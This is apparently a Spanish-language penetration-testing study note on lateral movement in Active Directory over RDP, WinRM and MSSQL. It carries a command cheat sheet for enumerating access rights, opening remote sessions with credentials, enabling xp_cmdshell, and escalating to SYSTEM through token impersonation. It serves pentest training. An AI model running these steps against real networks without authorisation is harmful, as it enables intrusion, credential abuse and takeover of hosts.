---
tags:
  - lateralmovement
  - RDP
  - WinRM
  - MSSQL
  - AD
---
## Conceptos Clave (TL;DR)

* El objetivo del movimiento lateral es avanzar en el dominio obteniendo acceso a otros hosts cuando aún no se cuenta con derechos de administrador local sobre ninguno.

* Los protocolos comunes para lograr esto incluyen RDP (acceso a GUI), PowerShell Remoting/WinRM (acceso de línea de comandos remota) y MSSQL Server (ejecución de consultas y comandos).

* El acceso de bajo privilegio a través de estos servicios puede utilizarse para robar datos, recolectar credenciales o explotar vectores locales (como `SeImpersonatePrivilege`) para escalar a SYSTEM.


## Herramientas Clave

* **[BloodHound](../../../📂%2008%20Herramientas&Cheatsheets/BloodHound.md):** Utilizado para la enumeración visual rápida de derechos de acceso delegado (CanRDP, CanPSRemote, SQLAdmin) mediante consultas preestablecidas o Cypher personalizadas.

* **PowerView:** Script en PowerShell para enumerar los miembros de grupos locales importantes como "Remote Desktop Users" o "Remote Management Users" directamente desde un host comprometido.

* **Evil-WinRM / Enter-PSSession:** Herramientas para establecer sesiones de PowerShell Remoting desde entornos Linux y Windows respectivamente.

* **PowerUpSQL / mssqlclient.py:** Utilidades para descubrir, autenticar y ejecutar consultas/comandos en instancias de MSSQL Server remotas.

* **xfreerdp / Remmina / mstsc.exe:** Clientes para establecer conexiones RDP hacia el host objetivo.

  

## Metodología Paso a Paso

1. **Fase 1: Enumeración de Derechos Delegados.** Utilizar herramientas (BloodHound, PowerView) para identificar cuentas bajo nuestro control (o grupos de los que formamos parte, como Domain Users) que posean permisos de RDP, WinRM o Sysadmin sobre bases de datos SQL en equipos remotos.

2. **Fase 2: Conexión Remota.** Según el protocolo descubierto, autenticarse en el host objetivo utilizando clientes legítimos desde nuestra máquina atacante (Linux o Windows) empleando credenciales en claro o ataques Pass-the-Hash si es aplicable.

3. **Fase 3: Post-Explotación de Servicios (Caso MSSQL).** Si la conexión es a una base de datos MSSQL, habilitar la ejecución de comandos a nivel de sistema operativo para obtener una shell subyacente.

4. **Fase 4: Escalada de Privilegios.** Revisar los privilegios asignados al token del usuario; si se detectan permisos como `SeImpersonatePrivilege`, ejecutar técnicas de impersonación (ej. PrintSpoofer, JuicyPotato) para alcanzar privilegios máximos.

  

## Cheat Sheet de Comandos

```powershell
# Usando PowerView para enumerar usuarios con permisos de RDP en un host específico
Get-NetLocalGroupMember -ComputerName <TARGET_COMPUTER> -GroupName "Remote Desktop Users"

  
# Usando PowerView para enumerar usuarios con permisos de WinRM en un host específico
Get-NetLocalGroupMember -ComputerName <TARGET_COMPUTER> -GroupName "Remote Management Users"

  
# Establecer sesión remota WinRM desde un host atacante Windows usando credenciales
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)

Enter-PSSession -ComputerName <TARGET_COMPUTER> -Credential $cred

  
# PowerUpSQL: Importar módulo y enumerar instancias SQL en el dominio
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

  
# PowerUpSQL: Ejecutar consultas en una base de datos de manera remota

Get-SQLQuery -Verbose -Instance "<TARGET_IP>,<PORT>" -username "<DOMAIN>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
# BloodHound Cypher Query (Añadir en Raw Query): Buscar usuarios con permisos WinRM
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

  
# BloodHound Cypher Query (Añadir en Raw Query): Buscar usuarios con permisos SQLAdmin
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

  
# Conexión a un host remoto usando evil-winrm (WinRM desde Linux)
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>

  
# Conexión remota a MSSQL usando Impacket (mssqlclient.py) con autenticación de Windows
mssqlclient.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -windows-auth
```

```sql
# Dentro de mssqlclient.py (SQL Shell): Habilitar la ejecución de comandos del sistema operativo

enable_xp_cmdshell

  
# Dentro de mssqlclient.py (SQL Shell): Ejecutar un comando OS usando xp_cmdshell para verificar privilegios locales

xp_cmdshell whoami /priv
```

## "Gotchas" y Troubleshooting

* **Grupos por Defecto Inseguros:** Es muy común encontrar que todo el grupo "Domain Users" (o usuarios del dominio) tiene acceso RDP a servidores RDS o Jump Hosts; revisar esto siempre primero en BloodHound.

* **Escalada en MSSQL casi garantizada:** El acceso como Sysadmin en instancias MSSQL casi siempre resulta en acceso de nivel SYSTEM sobre el host, ya que la cuenta de servicio suele poseer el privilegio `SeImpersonatePrivilege`.

* **xp_cmdshell por defecto apagado:** Para ejecutar comandos desde MSSQL es imperativo usar el comando `enable_xp_cmdshell` primero; sin esto, las consultas al sistema operativo fallarán.

* **Credenciales SQL sueltas:** Si encuentras credenciales en archivos `web.config` u otros scripts (potencialmente usando herramientas como Snaffler), siempre pruébalas contra todos los servidores MSSQL del entorno.

* **Limitaciones de Evil-WinRM:** Al conectarte por WinRM con Evil-WinRM, es posible que recibas una advertencia de que la compleción de rutas remotas está desactivada por limitaciones de Ruby en ciertas máquinas, lo cual es normal y no afecta la ejecución de comandos.

* **Enumeración iterativa:** Cada vez que comprometas un nuevo host o usuario a través del movimiento lateral, debes repetir la enumeración inicial para mapear nuevos accesos u objetivos que hayan sido revelados.